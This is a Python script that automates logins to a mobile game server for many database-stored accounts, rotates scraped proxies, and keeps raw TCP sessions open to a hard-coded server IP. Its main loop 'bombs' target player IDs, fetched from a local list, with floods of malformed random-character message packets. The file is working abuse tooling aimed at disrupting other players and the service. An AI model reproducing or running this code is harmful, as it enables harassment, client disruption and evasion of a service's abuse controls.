#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import asyncio
import socket
import sqlite3
import json
import sys
import traceback

import aiohttp
import requests

import socks
from lib import make_logon_data, get_proxies, del_proxy, make_send_msg_data, make_bad_msg_data, Session, init_data, make_create_role_data

headers = {
    "User-Agent": "Mozilla/5.0 (Linux; U; Android 9.0.1; en-us;) AppleWebKit/533.1 (KHTML, like Gecko) Version/5.0 Mobile Safari/533.1"
}
# socket.socket = socks.socksocket

def get_proxies2():
    proxies = requests.get("https://proxy.ishield.cn/?types=0&count={}".format(300)).json()
    proxies += requests.get("https://proxy.ishield.cn/?types=1&count={}".format(300)).json()
    return set("{} {}".format(proxy[0], proxy[1]) for proxy in proxies)

async def user_do(username, imei, passwd='V0\/wJekk6Kk=', proxy=None):
    # return user_id and session for login_verify api
    version = 'Android1.0.1'
    tpl = '{"uid":"","token":"","uName":"%s","nickName":"","password":"%s","version":"%s","imei":"%s","authCode":"","flag":1,"isfast":"0","thirdType":1,"thirdToken":"","thirdUid":"","fbBusinessToken":"","language":"Cn","appKey":"76749c0621384a96b744ccb089567bcf"}'
    j = tpl % (username, passwd, version, imei)
    url = 'http://haiwaitest.3333.cn:8008/sdk/user/user.do'
    async with aiohttp.ClientSession() as session:
        async with session.post(url, data=j, headers=headers, proxy=proxy, timeout=3) as resp:
            t = await resp.text()
            r = json.loads(t)
            assert r["code"] == 100
    return r['uid'], r['token']

async def login_verify(user_id, token, version='1.6.61095', proxy=None):
    # return tcp session
    url = 'http://sgz-login.fingerfunol.com:30006/entry_server/login_verify?version=%s&server_id=20&userid=%s&channel=4&session=%s&platform=a8card&isdebug=False&activation_code=' % (version, user_id, token)
    async with aiohttp.ClientSession() as session:
        async with session.get(url, headers=headers, proxy=proxy, timeout=5) as resp:
            t = await resp.text()
            r = json.loads(t)
    return r['session']

def char_gen():
    blocks = [15708544, 15708800, 15709056, 15709312]
    random.shuffle(blocks)
    char = random.randint(blocks[0], blocks[0] + 63).to_bytes(3, byteorder="big")
    return char

async def heartbeat(writer):
    while True:
        await asyncio.sleep(10)
        try:
            writer.write(b'\x00\x00\x00\x02\x01\x00')
            await writer.drain()
        except:
            print(traceback.format_exc())
            break

async def read_bytes(reader, length):
    buf = b""
    while len(buf) < length:
        d = await reader.read(length - len(buf))
        if not d:
            raise BaseException("get null data!!!")
        buf += d
    return buf

async def read_one(reader):
    # read and process packages
    head = await read_bytes(reader, 4)
    body = await read_bytes(reader, int.from_bytes(head, byteorder="big"))
    return head, body


async def one(loop, email, wait=0):
    """maintance one bomb sender"""
    imei = "".join(str(random.randint(0,9)) for x in range(1, len("863272039030961")+1))
    version = "1.6.61095"
    uid, token, session = None, None, None
    while True:
        print("start:", email)
        try:
            if not uid or not token:
                uid, token = await user_do(email, imei)
            try:
                session = await login_verify(uid, token, version=version)
            except:
                print("saved uid,token is expired")
                uid, token = await user_do(email, imei)
                session = await login_verify(uid, token, version=version)

            fut = asyncio.open_connection('128.14.236.49', 30000)
            reader, writer = await asyncio.wait_for(fut, timeout=3)
            writer.write(make_logon_data(version, uid, imei, session))
            head, body = await read_one(reader)
            r = init_data(body)
            print(r)
            writer.write(b'\x00\x00\x00\x02\x01\x00')
            writer.write(b'\x00\x00\x00\x07\x00\x00\x00\x00\x00\x00\x05\x00\x00\x00\x07\x00\x01\x00\x00\x00\x00\x07')
            writer.write(b'\x00\x00\x00\x0e\x01\x01\x9f\x79\x05\x00\xf0\x1c\xf6\xc1\xab\x77\xd1\x41')
            asyncio.ensure_future(heartbeat(writer), loop=loop)
            i = 0
            print("bomb start------->>>>>>>")
            targets = []
            while True:
                i += 1
                if i % 5 == 0:
                    try:
                        async with aiohttp.ClientSession() as session:
                            while True:
                                async with session.get("http://localhost:7788/get_list", timeout=1) as resp:
                                    r = await resp.json()
                                if r:
                                    break
                                await asyncio.sleep(1)

                        targets = sorted(r.items(), key=lambda x: x[1])
                        print("targets:", targets)
                    except:
                        print(traceback.format_exc())
                        await asyncio.sleep(3)
                        continue
                bomb_list = targets[:12]
                if len(targets) > 12:
                    r = targets[12:]
                    random.shuffle(r)
                    bomb_list += r[:3]
                print("bombing list:", bomb_list)
                for receiver, t in bomb_list:
                    receiver = int(receiver)
                    writer.write(make_bad_msg_data(char_gen()*1, receiver, 4))
                    writer.write(make_bad_msg_data(char_gen()*1, receiver, 5))
                    writer.write(make_bad_msg_data(char_gen()*1, receiver, 6))
                    writer.write(make_bad_msg_data(char_gen()*1, receiver, 7))
                    writer.write(make_bad_msg_data(char_gen()*1, receiver, 8))
                await writer.drain()
        except BrokenPipeError:
            import traceback
            print(traceback.format_exc())
            print(email, "disconnected after", i, "turns")
        except:
            import traceback
            print("wtf!!!!", traceback.format_exc())


async def count_down(sec):
    await asyncio.sleep(sec)
    exit()

if __name__ == "__main__":
    loop = asyncio.get_event_loop()
    guards = []
    conn = sqlite3.connect("data.db")
    conn.isolation_level = None   # auto commit
    c = conn.cursor()
    c.execute("SELECT * FROM guards WHERE length(name)==3 ORDER BY RANDOM() LIMIT 20")
    idx = 0
    for row in c.fetchall():
        idx += 1
        email = row[0]
        guards.append(one(loop, email, 0))
    loop.run_until_complete(asyncio.gather(*guards))
    loop.close()
